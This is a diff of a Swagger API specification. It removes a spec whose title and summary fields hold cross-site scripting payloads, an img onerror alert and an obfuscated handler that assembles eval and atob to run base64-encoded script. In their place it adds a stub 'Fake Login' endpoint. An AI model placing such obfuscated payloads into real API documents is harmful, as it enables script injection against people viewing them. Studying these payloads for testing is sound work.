@@ -1,14 +1,11 @@
-{
-  "swagger": "2.0",
-  "info": { "title": "<img src=x onerror=alert(1)>", "version": "1.0.0" },
-  "paths": {
-    "/pwned": {
-      "get": {
-        "summary": "You've been tricked<address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>",
-        "responses": {
-          "200": { "description": "Pwned" }
-        }
-      }
+"/auth/login": {
+  "post": {
+    "summary": "Fake Login",
+    "parameters": [
+      { "in": "body", "name": "credentials", "required": true }
+    ],
+    "responses": {
+      "200": { "description": "Login successful" }
     }
   }
 }
